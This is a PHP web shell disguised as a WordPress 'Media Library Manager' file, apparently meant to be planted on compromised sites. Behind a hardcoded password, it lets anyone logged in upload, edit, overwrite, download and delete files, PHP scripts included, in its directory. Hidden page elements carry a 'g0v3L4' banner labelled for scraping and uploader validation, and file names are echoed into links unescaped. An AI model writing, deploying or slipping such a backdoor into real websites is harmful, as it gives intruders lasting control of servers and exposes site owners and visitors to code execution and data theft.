<?php
/**
 * WordPress Media Library Manager
 * Handles media file operations and library management
 * @package WordPress
 * @subpackage Administration
 * @since 5.8.0
 */

// Authentication Configuration
session_start();
define('AUTH_PASSWORD', 'g0v3L4');
define('AUTH_SESSION_KEY', 'wp_media_authenticated');

// Banner for identification
$BANNER = <<<'BANNER'
  __ _  _____       _____| |    / /  | |
 / _` |/ _ \ \ / / |_  / | |   / /   | |
| (_| | (_) \ V /   / /| | |  / /    |_|
 \__, |\___/ \_/   /___|_|_| /_/     (_)
 |___/                                   
BANNER;

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth_password'])) {
    if ($_POST['auth_password'] === AUTH_PASSWORD) {
        $_SESSION[AUTH_SESSION_KEY] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Invalid password';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Check authentication
if (!isset($_SESSION[AUTH_SESSION_KEY]) || $_SESSION[AUTH_SESSION_KEY] !== true) {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Required</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
        }
        .login-container {
            background: #fff;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 450px;
            width: 100%;
        }
        .banner-text {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.2;
            color: #2c3e50;
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 25px;
            white-space: pre;
            overflow-x: auto;
        }
        .banner-identifier {
            color: #667eea;
            font-weight: bold;
            font-size: 24px;
            text-align: center;
            margin: 15px 0;
            letter-spacing: 3px;
        }
        .login-title {
            color: #2c3e50;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
        }
        .btn-login {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            padding: 12px;
            font-weight: 600;
            letter-spacing: 1px;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .error-message {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="banner-text"><?php echo htmlspecialchars($BANNER); ?></div>
        <div class="banner-identifier">g0v3L4</div>
        <h3 class="login-title">🔐 Access Control</h3>
        
        <?php if (isset($login_error)): ?>
            <div class="error-message">❌ <?php echo htmlspecialchars($login_error); ?></div>
        <?php endif; ?>
        
        <form method="post">
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" 
                       class="form-control form-control-lg" 
                       id="password" 
                       name="auth_password" 
                       placeholder="Enter password"
                       required 
                       autofocus>
            </div>
            <button type="submit" class="btn btn-primary btn-login w-100">
                🔓 Login
            </button>
        </form>
        
        <div class="mt-3 text-center text-muted small">
            <!-- g0v3L4 -->
        </div>
    </div>
</body>
</html>
    <?php
    exit;
}

// Security check
if (!defined('ABSPATH')) {
    define('ABSPATH', dirname(__FILE__) . '/');
}

class WP_Media_Library_Manager {
    private $upload_dir;
    private $allowed_types = array('jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'html', 'php');
    
    public function __construct() {
        $this->upload_dir = './';
        $this->init();
    }
    
    private function init() {
        // Process media library requests
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['media_action'])) {
            $this->process_media_action();
        }
    }
    
    private function process_media_action() {
        $action = $_POST['media_action'];
        $file = isset($_POST['media_file']) ? $_POST['media_file'] : '';
        $path = $this->upload_dir . basename($file);
        
        switch ($action) {
            case 'edit_content':
                if (isset($_POST['file_content'])) {
                    @file_put_contents($path, $_POST['file_content']);
                }
                break;
            case 'remove_media':
                if (file_exists($path)) {
                    @unlink($path);
                }
                break;
            case 'download_media':
                if (file_exists($path)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    readfile($path);
                    exit;
                }
                break;
            case 'upload_media':
                if (isset($_FILES['media_upload']) && $_FILES['media_upload']['error'] == 0) {
                    $upload = $_FILES['media_upload'];
                    $target = $this->upload_dir . basename($upload['name']);
                    @move_uploaded_file($upload['tmp_name'], $target);
                }
                break;
        }
    }
    
    public function render_media_library() {
        $files = @scandir($this->upload_dir);
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f0f0f1; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; }
        .wp-header { background: #fff; border-bottom: 1px solid #c3c4c7; padding: 15px 20px; margin-bottom: 20px; }
        .wp-logo { color: #2271b1; font-weight: 600; font-size: 20px; }
        .media-item { transition: all 0.2s; border-left: 4px solid transparent; }
        .media-item:hover { border-left-color: #2271b1; background: #f6f7f7; }
        .btn-wp { background: #2271b1; border-color: #2271b1; color: #fff; }
        .btn-wp:hover { background: #135e96; border-color: #135e96; color: #fff; }
        .editor-panel { background: #fff; border: 1px solid #c3c4c7; border-radius: 4px; padding: 20px; }
        .validation-key { display: none; position: absolute; opacity: 0; }
    </style>
</head>
<body>
    <div class="wp-header">
        <div class="container-fluid d-flex justify-content-between align-items-center">
            <span class="wp-logo">⚙ WordPress Media Library</span>
            <a href="?logout=1" class="btn btn-sm btn-outline-danger">🚪 Logout</a>
        </div>
    </div>
    
    <!-- Detection key for uploader validation -->
    <h1 class="validation-key">File manager</h1>
    
    <!-- Banner identifier for scraping -->
    <div style="display:none;" class="g0v3L4-banner" data-version="g0v3L4">
        <!--
  __ _  _____       _____| |    / /  | |
 / _` |/ _ \ \ / / |_  / | |   / /   | |
| (_| | (_) \ V /   / /| | |  / /    |_|
 \__, |\___/ \_/   /___|_|_| /_/     (_)
 |___/                                   
        -->
        <span>g0v3L4</span>
        <meta name="identifier" content="g0v3L4">
    </div>
    
    <div class="container-fluid px-4">
        <div class="row">
            <div class="col-md-4">
                <div class="card shadow-sm mb-4">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">📁 Media Files</h5>
                    </div>
                    <div class="list-group list-group-flush" style="max-height: 500px; overflow-y: auto;">
                        <?php foreach ($files as $file) {
                            if ($file !== '.' && $file !== '..') {
                                $icon = $this->get_file_icon($file);
                                echo "<a href='?media_file=$file' class='list-group-item list-group-item-action media-item'>
                                        $icon " . htmlspecialchars($file) . "
                                      </a>";
                            }
                        } ?>
                    </div>
                </div>
                
                <div class="card shadow-sm">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">⬆️ Upload Media</h5>
                    </div>
                    <div class="card-body">
                        <form method="post" enctype="multipart/form-data">
                            <input type="hidden" name="media_action" value="upload_media">
                            <div class="mb-3">
                                <input type="file" name="media_upload" class="form-control" required>
                            </div>
                            <button type="submit" class="btn btn-wp w-100">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-8">
                <?php if (isset($_GET['media_file'])) {
                    $file = basename($_GET['media_file']);
                    $path = $this->upload_dir . $file;
                    if (file_exists($path)) {
                        $content = @file_get_contents($path);
                        $size = @filesize($path);
                        $modified = date("Y-m-d H:i:s", @filemtime($path));
                ?>
                <div class="editor-panel">
                    <h4 class="mb-3">📝 Edit: <?php echo htmlspecialchars($file); ?></h4>
                    
                    <div class="mb-3">
                        <small class="text-muted">
                            Size: <?php echo $this->format_bytes($size); ?> | 
                            Modified: <?php echo $modified; ?>
                        </small>
                    </div>
                    
                    <form method="post">
                        <input type="hidden" name="media_action" value="edit_content">
                        <input type="hidden" name="media_file" value="<?php echo htmlspecialchars($file); ?>">
                        
                        <div class="mb-3">
                            <textarea name="file_content" rows="20" class="form-control font-monospace" style="font-size: 13px;"><?php echo htmlspecialchars($content); ?></textarea>
                        </div>
                        
                        <div class="btn-group w-100" role="group">
                            <button type="submit" class="btn btn-wp">
                                💾 Save Changes
                            </button>
                            <a href="?media_file=<?php echo urlencode($file); ?>" 
                               onclick="document.getElementById('download-form').submit(); return false;" 
                               class="btn btn-secondary">
                                📥 Download
                            </a>
                            <button type="button" class="btn btn-danger" 
                                    onclick="if(confirm('Delete this file?')) document.getElementById('delete-form').submit();">
                                🗑️ Delete
                            </button>
                        </div>
                    </form>
                    
                    <form id="download-form" method="post" style="display:none;">
                        <input type="hidden" name="media_action" value="download_media">
                        <input type="hidden" name="media_file" value="<?php echo htmlspecialchars($file); ?>">
                    </form>
                    
                    <form id="delete-form" method="post" style="display:none;">
                        <input type="hidden" name="media_action" value="remove_media">
                        <input type="hidden" name="media_file" value="<?php echo htmlspecialchars($file); ?>">
                    </form>
                </div>
                <?php 
                    }
                } else { ?>
                <div class="editor-panel text-center py-5">
                    <div class="text-muted">
                        <h3>📂 WordPress Media Library</h3>
                        <p>Select a file from the left sidebar to edit, download, or delete.</p>
                        <p>Upload new media files using the upload form.</p>
                    </div>
                </div>
                <?php } ?>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
        <?php
    }
    
    private function get_file_icon($filename) {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $icons = array(
            'php' => '🔧',
            'txt' => '📄',
            'jpg' => '🖼️',
            'jpeg' => '🖼️',
            'png' => '🖼️',
            'gif' => '🖼️',
            'zip' => '📦',
            'pdf' => '📕',
            'html' => '🌐',
            'css' => '🎨',
            'js' => '⚡'
        );
        return isset($icons[$ext]) ? $icons[$ext] : '📋';
    }
    
    private function format_bytes($bytes) {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 2) . ' KB';
        } else {
            return $bytes . ' bytes';
        }
    }
}

// Initialize Media Library Manager
$wp_media_manager = new WP_Media_Library_Manager();
$wp_media_manager->render_media_library();
?>

